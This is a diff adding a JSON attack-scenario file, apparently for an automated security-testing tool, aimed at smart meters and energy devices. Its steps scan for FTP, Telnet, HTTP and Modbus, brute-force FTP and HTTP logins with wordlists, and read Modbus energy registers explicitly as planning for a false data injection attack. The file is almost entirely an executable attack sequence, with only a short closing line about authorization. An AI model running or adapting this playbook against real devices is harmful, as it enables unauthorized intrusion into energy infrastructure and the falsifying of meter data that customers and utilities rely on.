@@ -1,0 +1,98 @@
+{
+  "name": "Smart Meter FDI Attack",
+  "description": "False Data Injection attack scenario for smart metering devices including FTP exploitation, Modbus manipulation, and data integrity testing",
+  "steps": [
+    {
+      "tool": "nmap",
+      "args": ["-p", "21,23,80,502,8080", "-sV", "-A", "{{TARGET_IP}}"],
+      "description": "Comprehensive scan for smart meter services (FTP, Telnet, HTTP, Modbus)",
+      "extract": {
+        "ftp_open": {
+          "pattern": "21/tcp\\s+open",
+          "description": "Check if FTP port is open"
+        },
+        "modbus_open": {
+          "pattern": "502/tcp\\s+open",
+          "description": "Check if Modbus port is open"
+        },
+        "http_open": {
+          "pattern": "80/tcp\\s+open",
+          "description": "Check if HTTP port is open"
+        }
+      }
+    },
+    {
+      "tool": "hydra",
+      "args": ["-L", "/usr/share/wordlists/metasploit/user.txt", "-P", "/usr/share/wordlists/metasploit/password.txt", "ftp://{{TARGET_IP}}"],
+      "description": "FTP brute force attack on smart meter device",
+      "condition": {
+        "if": "{{ftp_open}}",
+        "operator": "exists"
+      },
+      "extract": {
+        "ftp_creds": {
+          "pattern": "login: (.+?) password: (.+)",
+          "description": "Extract successful FTP credentials"
+        }
+      }
+    },
+    {
+      "tool": "nmap",
+      "args": ["--script=ftp-anon", "-p", "21", "{{TARGET_IP}}"],
+      "description": "Check for anonymous FTP access on smart meter"
+    },
+    {
+      "tool": "nikto",
+      "args": ["-h", "http://{{TARGET_IP}}"],
+      "description": "Web vulnerability scanning for smart meter web interface",
+      "condition": {
+        "if": "{{http_open}}",
+        "operator": "exists"
+      }
+    },
+    {
+      "tool": "mbtget",
+      "args": ["-r3", "-a0", "-n50", "{{TARGET_IP}}"],
+      "description": "Read Modbus input registers from smart meter (energy data)",
+      "condition": {
+        "if": "{{modbus_open}}",
+        "operator": "exists"
+      }
+    },
+    {
+      "tool": "nmap",
+      "args": ["--script=modbus-discover", "-p", "502", "{{TARGET_IP}}"],
+      "description": "Enumerate Modbus device details and registers",
+      "condition": {
+        "if": "{{modbus_open}}",
+        "operator": "exists"
+      }
+    },
+    {
+      "tool": "plc_tool",
+      "args": ["{{TARGET_IP}}", "502", "read", "0", "100"],
+      "description": "Read energy measurement registers for FDI attack planning",
+      "condition": {
+        "if": "{{modbus_open}}",
+        "operator": "exists"
+      }
+    },
+    {
+      "tool": "hydra",
+      "args": ["-L", "/usr/share/wordlists/metasploit/user.txt", "-P", "/usr/share/wordlists/metasploit/password.txt", "http-get://{{TARGET_IP}}"],
+      "description": "HTTP authentication brute force for web interface access",
+      "condition": {
+        "if": "{{http_open}}",
+        "operator": "exists"
+      }
+    }
+  ],
+  "metadata": {
+    "category": "Smart Grid/IoT",
+    "target_devices": ["Smart Meters", "Energy Monitoring Devices", "IEC 61850 devices"],
+    "protocols": ["Modbus TCP", "FTP", "HTTP"],
+    "attack_type": "False Data Injection (FDI)",
+    "severity": "critical",
+    "notes": "This scenario tests data integrity vulnerabilities in smart metering infrastructure. Critical infrastructure testing requires strict authorization and safety protocols."
+  }
+}
